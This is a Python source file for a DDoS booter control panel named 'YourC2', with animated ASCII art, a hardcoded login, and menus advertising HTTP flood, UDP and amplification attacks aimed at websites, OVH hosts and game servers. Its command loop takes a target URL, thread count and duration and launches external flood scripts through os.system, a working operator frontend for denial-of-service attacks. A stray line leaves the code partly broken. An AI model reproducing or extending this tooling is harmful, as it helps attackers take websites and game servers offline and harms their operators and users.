import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to YourC2 CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub:Jokop12-12\x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m1. Do not attack without someone's permission \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m3. Do not spam attacks                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. FK YOUR MOM repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
               🚀𝗠𝗘𝗧𝗛𝗢𝗗𝗦  𝗟𝗔𝗬𝗘𝗥𝟳🚀
               flood
               mix
               strom
               hold
               raw
               socket
               random
                            
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp-god             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap-vro          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome-god            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-fuck          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtelnet-god          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhaven-god           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movhamp              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mr6-drop           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfivem-drop          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mvse               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfortnite-fly        \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgame-crash        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"\x1b]2;YourC2")     
print("""
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿

     
𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙔𝙊𝙐𝙍𝘾2 
      𝙏𝙔𝙋𝙀 𝙃𝙀𝙇𝙋
""")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[1337\x1b[38;2;0;186;45m@S\x1b[38;2;0;150;88mta\x1b[38;2;0;113;133mnl\x1b[38;2;0;83;168mey\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        
        elif "flood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: flood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: flood http://example.com 15000 get 60')
                
        elif "hold" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HOLD.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: hold <url> <threads> METHODS<GET/POST> <time>')
                print('Example: hold http://example.com 15000 GET 60')

        elif "mix" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run http-mix.js {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: mix <url> <time><threads><GET/POST/UKNOWN>')
                print('http://example.com> <60> <30>')

        elif "socket" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run https-socket.js  nil ')
            except IndexError:
                print('Usage: socket <url> <10000> <50> <100><time>')
                print('Example: socket http-get http://example.com 10000 50 100')
                
                

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

         22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
                                
LAYER7  ► SHOW LAYER7 METHODS 
LAYER4  ► SHOW LAYER4 METHODS
GAME ► SHOW GAME METHODS
RULES   ► BACA RULES YE MEMEK
CLS ► CLS 
PORTS ► SHOW ALL PORTS
AMP ►AMP Methods
TOOLS ►SHOW TOOLS
CLEAR   ► CLEAR YOUR TERMINAL
Exit ► Keluar dari tools

        𝗖𝟮 𝗜𝗡𝗶 𝗠𝗔𝗦𝗜𝗛 𝗕𝗘𝗟𝗨𝗠 𝗦𝗘𝗠𝗣𝗨𝗥𝗡𝗔
        𝙎𝙀𝙆𝙄𝘼𝙉 𝘿𝘼𝙍𝙄 𝙎𝘼𝙔𝘼 𝙏𝙀𝙍𝙄𝙈𝘼𝙆𝘼𝙎𝙄𝙃

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "Owner Ganteng"
    passwd = "hehe"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to YourC2 CnC!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
